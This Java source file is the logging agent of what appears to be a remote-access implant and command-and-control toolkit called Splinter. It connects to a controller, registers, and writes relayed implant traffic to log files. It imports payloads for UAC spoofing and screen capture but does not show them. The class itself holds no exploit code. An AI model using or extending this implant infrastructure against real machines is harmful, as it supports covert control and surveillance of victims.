/**
 * Log all input that is received by the agent
 * 
 * @author Solomon Sonya
 */

package Controller.GUI;

import Implant.Driver;import Controller.Drivers.*;
import Controller.Thread.*;
import Implant.*;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.Payloads.Frame_SpoofUAC;
import Implant.Payloads.MapSystemProperties;
import Implant.Payloads.Frame_Render_Captured_Screen;
import Implant.Payloads.Worker_Thread_Payloads;


import java.awt.Frame;

import javax.imageio.ImageIO;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.KeyEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;

import javax.swing.WindowConstants;
import javax.swing.table.*;
import java.lang.*;

import java.io.*;
import java.awt.GridBagLayout;

public class Splinter_LOGGIE extends Thread implements Runnable
{
	public static final String strMyClassName = "Splinter_LOGGIE";
	
	public static File myOutputTopDirectory = null;
	public static File myLogDirectory = null;
	public static File myLogFile_CONVERTED = null;
	public static File myLogFile_RAW = null;
	
	public static PrintWriter pwOut_LogFile_CONVERTED = null;
	public static PrintWriter pwOut_LogFile_RAW = null;
	
	boolean continueRun = true;
	
	String strLoggingDirectoryText = "Log";
	String strLoggingFileExtension = "log";
	
	String trafficDirectionIcon_OUT = "->";
	String trafficDirectionText_OUT = "OUT";
	
	String trafficDirectionIcon_IN = "<-";
	String trafficDirectionText_IN = "IN";
	
	String trafficDirectionIcon = "";
	String trafficDirectionText = "";
	
	String preamble = "";
	
	String [] arrCmd = null;
	
	String csvHeader = "Time, Time[Epoch], Traffic Direction, Traffic Direction, Thread ID, Agent Registration ID, Source Type, Destination Type, Source IP, Destination IP, Actual Traffic Data...";
	
	public static String separation_delimiter = ",";
	
	String controllerAddress = "";
	int controllerPORT = 0;
	
	Socket sktConnection = null;
	
	BufferedReader brIn = null;
	PrintWriter pwOut = null;
	
	public String myRegistrationID = "";
	
	public Splinter_LOGGIE(String controllerAddr, int controllerPort, String outFileTopFolder)
	{
		try
		{
			controllerAddress = controllerAddr;
			controllerPORT = controllerPort;
			
			myOutputTopDirectory = new File(outFileTopFolder);
			
			if(myOutputTopDirectory == null || !myOutputTopDirectory.exists() || !myOutputTopDirectory.isDirectory())
			{
				Driver.jop_Error("Invalid Logging Directory Specified", "Unable to continue...");
				myOutputTopDirectory = selectLoggingTopDirectory();
			}
			
			continueRun = configureEnvironmentForLogging(myOutputTopDirectory);
			
			
			//
			//start the thread
			//
			Driver.sop("Configuration complete. All required data should be setup. Launching thread...");
			this.start();
		}
		catch(Exception e)
		{
			Driver.eop("Splinter_LOGGIE Constructor", strMyClassName, e, "", false);
		}
	}
	
	public void run()
	{
		try
		{
			if(continueRun)
			{
				Driver.sop("In thread run... ready to continue...");
				
				//this.log(false, 123, "8804123", "CONTROLLER", "RECIPIENT", "127.0.0.1", "192.138.195.5", "[SPLINTER_REGISTRATION]1" + Driver.delimeter_1 + "2" + Driver.delimeter_1 + "3" + Driver.delimeter_1 + "4" + Driver.delimeter_1 + "5" + Driver.delimeter_1 + "6" + Driver.delimeter_1 + "7");
				
				//establish connection to controller
				continueRun = authenticateWithController(controllerAddress, controllerPORT);
				
				String inputLine = "";
				
				String []msgToLog = null;
				boolean directionComingIn = false;
				
				while(continueRun && !sktConnection.isClosed() && ((inputLine = brIn.readLine()) != null && !inputLine.equals(Driver.DISCONNECT_LOGGER)) )//listen until agent says disconnect
				{
					try
					{
						msgToLog = inputLine.split(Driver.delimeter_3_logging);
						
						if(msgToLog == null || msgToLog.length < 1)
						{
							continue;
						}
						
						if(msgToLog[0].trim().equalsIgnoreCase("true"))
						{
							directionComingIn = true;
						}
						else
						{
							directionComingIn = false;
						}
						
						//Driver.jop("Size: " + msgToLog.length);
						//Driver.jop("directionComingIn: " + directionComingIn + "\n msgToLog[1]: " + msgToLog[1]+ "\n msgToLog[2]: " + msgToLog[2]+ "\n msgToLog[3]: " + msgToLog[3]+ "\n msgToLog[4]: " + msgToLog[4]+ "\n msgToLog[5]: " + msgToLog[5]+ "\n msgToLog[6]: " + msgToLog[6]+ "\n msgToLog[7]: " + msgToLog[7]);
						
						//Test for beacon bot
						if(msgToLog[7].contains("BEACON") && msgToLog[3].trim().equalsIgnoreCase("UNKNOWN"))
						{
							msgToLog[3] = "SPLINTER - BEACON IMPLANT";
						}
						
						
						this.log(directionComingIn, msgToLog[1], msgToLog[2], msgToLog[3], msgToLog[4], msgToLog[5], msgToLog[6], msgToLog[7]);
					}
					catch(Exception e)
					{
						Driver.sop("Unknown line, skipping logging of: " + inputLine);
						continue;
					}
				}
				
				
			}
			else
			{
				Driver.sop("Unable to start logger agent. Terminating this thread...");
				
			}
		}
		
		catch(ConnectException ee)
		{
			Driver.sop("\nConnection Closed!\n");
		}
		catch(Exception e)
		{
			Driver.sop("\nConnection Closed!!! \n");
		}
		
		//
		//close log file streams
		//
		try
		{
			Driver.sp("Closing streams to logging files now...");
			
			this.pwOut_LogFile_CONVERTED.close();
			this.pwOut_LogFile_RAW.close();
			
			Driver.sp("Streams closed. \n");
		}catch(Exception e){}
		
		Driver.sop("Connection Terminated.  Closing Logging Agent Program...");
		
		
		
		System.exit(0);
	}
	
	public boolean authenticateWithController(String addr, int port)
	{
		try
		{
			Driver.sop("\n" + Driver.getTimeStamp_Without_Date() + "  Attempting to establish socket to " + addr + " : " + port + "...");
			
			//open the socket connection!!!
			sktConnection = new Socket(addr, port);
			
			//APPEARS WE HAVE A NEW CONNECTION, VERIFY IT'S NOT NULL
			if(sktConnection == null)
			{
				throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");//this should never happen
			}
			
			//
			//Open streams on Socket
			//
			String inputLine = "";
			brIn= null;
			pwOut = null; 
			
			//open streams
			Driver.sp("Connection established!  Attempting to open streams on socket...");
			
			//open reader
			brIn = new BufferedReader(new InputStreamReader(sktConnection.getInputStream()));
			
			//open writer
			pwOut = new PrintWriter(new BufferedOutputStream(sktConnection.getOutputStream()));
			
			//Streams opened
			Driver.sop("Streams opened");
			
			//package handshake
			String handShakeData = Driver.getHandshakeData(Driver.delimeter_1);
			
			//send handshake and register
			this.sendToController(Driver.LOGGIE_AGENT_REGISTRATION + handShakeData);
			
			//read myUniqueID
			myRegistrationID = brIn.readLine();
			
			Driver.sop("HandShake complete. " + "[SPLINTER@" + myRegistrationID + "]");
			
			return true;
		}
		catch(ConnectException ee)
		{
			Driver.sop("\nConnection Failed!  Unable to establish socket with " + addr + " : " + port + "\n");
		}
		catch(Exception e)
		{
			Driver.sop("\nConnection Failed!  Unable to establish socket with " + addr + " : " + port + "\n");
		}
		
		return false;
	}
	
	public boolean sendToController(String lineToSend)
	{
		try
		{
			if(pwOut == null || this.sktConnection == null || !this.sktConnection.isConnected())
			{
				Driver.sop("socket not yet connected");
				return false;
			}			
			
			pwOut.println(lineToSend);
			pwOut.flush();
						
			return true;
			
		}
		
		catch(Exception e)
		{
			Driver.eop("sendToController", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean log(boolean directionIN, String threadID, String agentRegistrationID, String sender, String recipient, String senderIP, String recipientIP, String line)
	{
		try
		{
			if(line == null || line.trim().equals(""))
				return false;
			
			if(directionIN)
			{
				trafficDirectionIcon = trafficDirectionIcon_IN;
				trafficDirectionText = trafficDirectionText_IN;
			}
			else
			{
				trafficDirectionIcon = trafficDirectionIcon_OUT;
				trafficDirectionText = trafficDirectionText_OUT;
			}
			
			preamble = Driver.getTimeStamp_Without_Date() + separation_delimiter + Driver.getTime_Current_Millis() + separation_delimiter + trafficDirectionText + separation_delimiter + trafficDirectionIcon + separation_delimiter +  threadID  + separation_delimiter + agentRegistrationID + separation_delimiter + sender  + separation_delimiter + recipient  + separation_delimiter + senderIP  + separation_delimiter + recipientIP  + separation_delimiter;
			
			this.writeToLog_RAW(preamble + line.trim());
			
			arrCmd = line.split(Driver.delimeter_1);
			this.writeToLog_CONVERTED(preamble + arrCmd[0]);
			
			for(int i = 1; i < arrCmd.length; i++)
			{
				this.writeToLog_CONVERTED(separation_delimiter + arrCmd[i]);
			}
			
			//
			//Terminate the line
			//
			writeLnToLog_RAW("\n");
			writeLnToLog_CONVERTED("\n");
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("log", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean writeLnToLog_RAW(String log)
	{
		try
		{
			this.pwOut_LogFile_RAW.println(log);
			this.pwOut_LogFile_RAW.flush();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("writeToLog_RAW", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean writeLnToLog_CONVERTED(String log)
	{
		try
		{
			this.pwOut_LogFile_CONVERTED.println(log);
			this.pwOut_LogFile_CONVERTED.flush();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("writeToLog_RAW", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean writeToLog_RAW(String log)
	{
		try
		{
			this.pwOut_LogFile_RAW.print(log);
			this.pwOut_LogFile_RAW.flush();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("writeToLog_RAW", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean writeToLog_CONVERTED(String log)
	{
		try
		{
			this.pwOut_LogFile_CONVERTED.print(log);
			this.pwOut_LogFile_CONVERTED.flush();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("writeToLog_RAW", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean configureEnvironmentForLogging(File topDirectory)
	{
		try
		{
			//
			//create logging directory
			//
			Driver.sop("Configuring system for logging...");
			if(topDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
				myLogDirectory = new File(topDirectory.getCanonicalPath() + strLoggingDirectoryText);
			else
				myLogDirectory = new File(topDirectory.getCanonicalPath() + Driver.fileSeperator + strLoggingDirectoryText);
			
			if(!myLogDirectory.exists() || !myLogDirectory.isDirectory())
			{
				boolean success = myLogDirectory.mkdir();
				
				if(!success)
				{
					throw new Exception("Could not create top directory");
				}
			}
			
			//
			//Create Logging files
			//
			Driver.sop("Logging Directory placed at: " + myLogDirectory.getCanonicalPath());
			Driver.sop("Configuring logging files now...");
			
			String time = Driver.getTime_Specified_Hyphenated(Driver.getTime_Current_Millis());
			
			if(myLogDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
			{								
				myLogFile_RAW = new File(myLogDirectory.getCanonicalPath() + time + "-SPLINTER_RAW." + this.strLoggingFileExtension);
				myLogFile_CONVERTED = new File(myLogDirectory.getCanonicalPath() + time + "-SPLINTER." + this.strLoggingFileExtension);
			}
			
			else
			{
				myLogFile_RAW = new File(myLogDirectory.getCanonicalPath() + Driver.fileSeperator + time + "-SPLINTER_RAW." + this.strLoggingFileExtension);
				myLogFile_CONVERTED = new File(myLogDirectory.getCanonicalPath() + Driver.fileSeperator + time + "-SPLINTER." + this.strLoggingFileExtension);
			}
			
			//
			//Drop log files to system
			//
			pwOut_LogFile_CONVERTED = new PrintWriter(new BufferedOutputStream(new FileOutputStream(myLogFile_CONVERTED.toString())));
			pwOut_LogFile_RAW = new PrintWriter(new BufferedOutputStream(new FileOutputStream(myLogFile_RAW.toString())));
			
			//
			//Write to the log file to ensure files are created appropriately
			//
			pwOut_LogFile_CONVERTED.println(Driver.TITLE + " \t[Log File] Created on " + Driver.getTimeStamp_Updated() + "\n\n");
			pwOut_LogFile_RAW.println(Driver.TITLE + " \t[Log File] Created on " + Driver.getTimeStamp_Updated() + "\n\n");			
			pwOut_LogFile_CONVERTED.flush();
			pwOut_LogFile_RAW.flush();
			
			this.writeLnToLog_CONVERTED(csvHeader);
			this.writeLnToLog_RAW(csvHeader);
			
			//
			//Notify user success!
			//
			Driver.sop("\nRAW log file successfully created at: \n" + myLogFile_RAW.getCanonicalPath());
			Driver.sop("\nCONVERTED log file successfully created at: \n" + myLogFile_CONVERTED.getCanonicalPath() + "\n");
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.jop("Unable to configure environment for logging, please specify a new directory");
			
		}
		
		File fle = selectLoggingTopDirectory();
		return configureEnvironmentForLogging(fle);
	}
	
	public File selectLoggingTopDirectory()
	{
		try
		{
			myOutputTopDirectory = Driver.querySelectFile(false, "Please Select the Directory to save log files", JFileChooser.DIRECTORIES_ONLY, false, false);
			
			if(myOutputTopDirectory == null || !myOutputTopDirectory.exists() || !myOutputTopDirectory.isDirectory())
			{
				Driver.jop_Error("Invalid Logging Directory Specified", "Unable to continue...");
				return selectLoggingTopDirectory();
			}
							
			return myOutputTopDirectory;
		}
		
		catch(Exception e)
		{
			Driver.jop_Error("Invalid Logging Directory Specified", "Unable to continue...");
		}
		
		return selectLoggingTopDirectory();
	}
	
}
